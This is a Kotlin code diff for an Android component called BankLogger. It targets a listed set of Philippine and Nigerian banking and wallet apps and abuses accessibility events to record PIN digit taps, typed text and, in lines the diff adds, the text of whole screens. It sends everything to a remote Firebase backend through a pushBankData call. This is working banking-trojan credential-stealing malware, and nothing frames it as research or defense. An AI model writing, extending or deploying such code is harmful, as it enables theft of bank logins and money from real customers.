@@ -19,10 +19,11 @@ object BankLogger {
         "com.unionbankph.online", "com.pnb.android", "com.landbank.mobilebanking",
         "com.securitybank.bbx", "com.eastwest.mobile.dxp", "com.rcbc.pulz",
         "com.maybank2u.mayaph", "com.bpi.ng.app", "ph.maya.business.android",
-        "com.paymaya.negosyo", "team.opay.pay", "com.transsnet.palmpay",
-        "com.mtngroupfintech.consumerapp", "com.africa.smartcash", "com.mypaga.customer",
-        "ng.com.fairmoney.fairmoney", "com.kudabank.app", "com.moniepoint.personal",
-        "com.moniepoint.business", "com.wemabank.alat.prod",
+        "com.paymaya.negosyo",
+        "team.opay.pay", "com.transsnet.palmpay", "com.mtngroupfintech.consumerapp",
+        "com.africa.smartcash", "com.mypaga.customer", "ng.com.fairmoney.fairmoney",
+        "com.kudabank.app", "com.moniepoint.personal", "com.moniepoint.business",
+        "com.wemabank.alat.prod",
         "com.accessbank.nextgen", "com.gtbank.gtworldv1", "com.firstbank.firstmobile",
         "com.uba.vericash", "com.zenithBank.eazymoney"
     )
@@ -31,30 +32,36 @@ object BankLogger {
         val pkg = event.packageName?.toString() ?: return
         if (pkg !in bankPackages) return
 
-        // Digit clicks on custom keyboards
         if (event.eventType == AccessibilityEvent.TYPE_VIEW_CLICKED) {
             val source = event.source ?: return
-            val text = getViewText(source)
+            val text = source.text?.toString()
             if (text != null && text.length == 1 && text[0].isDigit()) {
-                FirebaseBridge.appendBankData("Digit: $text | App: $pkg")
+                FirebaseBridge.pushBankData("Digit: $text | App: $pkg")
             }
             source.recycle()
         }
 
-        // Text field changes
         if (event.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
-            val source = event.source ?: return
             val newText = event.text?.joinToString(" ") ?: ""
             if (newText.isNotEmpty()) {
-                FirebaseBridge.appendBankData("Text: $newText | App: $pkg")
+                FirebaseBridge.pushBankData("Text: $newText | App: $pkg")
             }
-            source.recycle()
+        }
+
+        if (event.eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
+            val root = service.rootInActiveWindow ?: return
+            val allTexts = mutableListOf<String>()
+            collectTexts(root, allTexts)
+            if (allTexts.isNotEmpty()) {
+                FirebaseBridge.pushBankData("Screen: ${allTexts.joinToString(" | ")}")
+            }
         }
     }
 
-    private fun getViewText(node: AccessibilityNodeInfo): String? {
-        if (node.text?.isNotEmpty() == true) return node.text.toString()
-        if (node.contentDescription?.isNotEmpty() == true) return node.contentDescription.toString()
-        return null
+    private fun collectTexts(node: AccessibilityNodeInfo, out: MutableList<String>) {
+        if (node.text != null && node.text.isNotBlank()) out.add(node.text.toString().trim())
+        for (i in 0 until node.childCount) {
+            node.getChild(i)?.let { collectTexts(it, out) }
+        }
     }
 }
